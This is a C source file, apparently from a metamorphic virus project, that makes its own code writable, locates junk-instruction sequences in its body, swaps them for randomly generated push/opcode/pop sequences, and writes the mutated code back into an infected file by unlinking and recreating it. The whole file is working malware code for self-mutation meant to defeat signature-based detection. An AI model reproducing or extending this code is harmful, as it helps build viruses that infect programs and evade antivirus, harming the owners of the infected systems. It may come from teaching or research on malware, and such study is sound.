#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


#include "utils.h"
#include "death.h"
#include "syscall.h"

extern void __attribute__((naked)) _start(void);
extern void end(void);

#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start

int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};

/*
   This is the matrix of source and destination register opcodes for Intel.
   For example;
   0xB8 == "mov"
   0xB8 + 0xC0 == 0x178 "mov eax, eax"
   0xB8 + 0xC8 == 0x180 "mov eax, ebx"

	   EAX ECX EDX EBX ESP EBP ESI EDI
   EAX C0  C8  D0  D8  E0  E8  F0  F8
   ECX C1  C9  D1  D9  E1  E9  F1  F9
   EDX C2  CA  D2  DA  E2  EA  F2  FA
   EBX C3  CB  D3  DB  E3  EB  F3  FB
   ESP C4  CC  D4  DC  E4  EC  F4  FC
   EBP C5  CD  D5  DD  E5  ED  F5  FD
   ESI C6  CE  D6  DE  E6  EE  F6  FE
   EDI C7  CF  D7  DF  E7  EF  F7  FF
*/

static int find_pattern(uint8_t *self, size_t offset) {
	return (self[offset] == PUSH_OP &&
			self[offset + 1] == PUSH_RBX &&

			self[offset + 2] == OP_64 &&
			self[offset + 3] == XCHG &&
			self[offset + 4] == RAX_RAX &&

			self[offset + 5] == OP_64 &&
			self[offset + 6] == XCHG &&
			self[offset + 7] == RAX_RAX &&

			self[offset + 8] == POP_RBX &&
			self[offset + 9] == POP_OP);
}

static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {

	int j = 0;
	for (size_t i = 0; i < size - JUNK_LEN; i++) {
		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
			junk_offsets[j] = i;
			j++;
			i += JUNK_LEN;
		}
	}
}

typedef enum {
	OPCODE_XCHG  = 0x87, // XCHG r/m, r
	OPCODE_MOV   = 0x8B, // MOV r, r/m
	OPCODE_MOVSX = 0x63, // MOVSX r, r/m

	OPCODE_ADD_RM_R = 0x01, // ADD r/m, r
	OPCODE_ADD_R_RM = 0x03, // ADD r, r/m

	OPCODE_SUB_RM_R = 0x29, // SUB r/m, r
	OPCODE_SUB_R_RM = 0x2B, // SUB r, r/m

	OPCODE_ADC  = 0x11, // ADC r/m, r
	OPCODE_SBB  = 0x19, // SBB r/m, r
	OPCODE_ADD  = 0x83, // ADD r/m, r

    OPCODE_AND  = 0x21, // AND r/m, r
    OPCODE_OR   = 0x09, // OR r/m, r
    OPCODE_XOR  = 0x31, // XOR r/m, r
    OPCODE_TEST = 0x85, // TEST r/m, r
    OPCODE_CMP  = 0x39,  // CMP r/m, r

} Opcode;


static uint8_t get_random_opcode(void) {
	const uint8_t opcodes[] = {
		OPCODE_XCHG,
		OPCODE_MOV,
		OPCODE_MOVSX,
		OPCODE_ADD_RM_R,
		OPCODE_ADD_R_RM,
		OPCODE_SUB_RM_R,
		OPCODE_SUB_R_RM,
		OPCODE_ADC,
		OPCODE_SBB,
		OPCODE_AND,
		OPCODE_OR,
		OPCODE_XOR,
		OPCODE_TEST,
		OPCODE_CMP
	};

	uint8_t rand;
	getrandom(&rand, 1, 0);
	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];

}

static void gen_junk(uint8_t *rdm_junk) {

	uint8_t rand[2];
	getrandom(rand, 2, 0);
	uint8_t reg_1 = rand[0] % 4;
	uint8_t reg_2 = rand[1] % 4;

	while (reg_1 == reg_2) {
		getrandom(rand, 2, 0);
		reg_2 = rand[1] % 4;
	}

	JUNK;

	uint8_t push_1 = PUSH_OP + reg_1;
	uint8_t push_2 = PUSH_OP + reg_2;

	uint8_t pop_1 = POP_OP + reg_1;
	uint8_t pop_2 = POP_OP + reg_2;

	uint8_t nop_1[3] = {OP_64, XCHG, RAX_RAX};
	uint8_t nop_2[3] = {OP_64, XCHG, RAX_RAX};

	uint8_t opcode_1 = get_random_opcode();
	uint8_t opcode_2 = get_random_opcode();

	nop_1[1] = opcode_1;
	nop_1[2] += reg_1;
	nop_1[2] += (reg_2 << 3);

	nop_2[1] = opcode_2;
	nop_2[2] += reg_2;
	nop_2[2] += (reg_1 << 3);

	rdm_junk[0] = push_1;
	rdm_junk[1] = push_2;
	rdm_junk[2] = nop_1[0];
	rdm_junk[3] = nop_1[1];
	rdm_junk[4] = nop_1[2];
	rdm_junk[5] = nop_2[0];
	rdm_junk[6] = nop_2[1];
	rdm_junk[7] = nop_2[2];
	rdm_junk[8] = pop_2;
	rdm_junk[9] = pop_1;

	JUNK;
}

static void replace_nop(uint8_t *self, int *junk_offsets) {


	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
		/* at this point junk_offsets is filled */
		if (junk_offsets[i] == 0) {
			break;
		}
		uint8_t rdm_junk[10];
		gen_junk(rdm_junk);
		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

static int make_writeable(uint8_t *self, size_t size) {
	uintptr_t start = (uintptr_t)self;
	uintptr_t end = start + size;

	JUNK;

	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}
	return 0;
}

void prepare_mutate(int opt) {
	(void)opt;

	uintptr_t start = (uintptr_t)&_start;

	make_writeable((uint8_t *)start, VIRUS_SIZE);

	JUNK;

	if (g_junk_offsets[0] != 0)
		return;

	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
}

void mutate(void) {

	JUNK;

	uintptr_t start = (uintptr_t)&_start;

	replace_nop((uint8_t *)start, g_junk_offsets);
}

int death(int start_offset, file_t *file) {


	JUNK;

	uint8_t *self = (uint8_t *)file->view->data;
	char *self_name = file->abs_path;
	int fd;

	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;

	uint8_t *junk = self + junk_pos + start_offset;

	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));


	uint8_t *entry = self + start_offset;

	JUNK;

	replace_nop(entry, g_junk_offsets);

	if (unlink(self_name) == -1) {
		munmap(self, file->view->size);
		return -1;
	}

	JUNK;

	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
	if (fd == -1)
		return -1;


	if (write(fd, self, file->view->size) == -1) {
		close(fd);
		munmap(self, file->view->size);
		return -1;
	}

	JUNK;

	if (munmap(self, file->view->size) == -1) {
		close(fd);
		return -1;
	}

	close(fd);

	return 0;
}
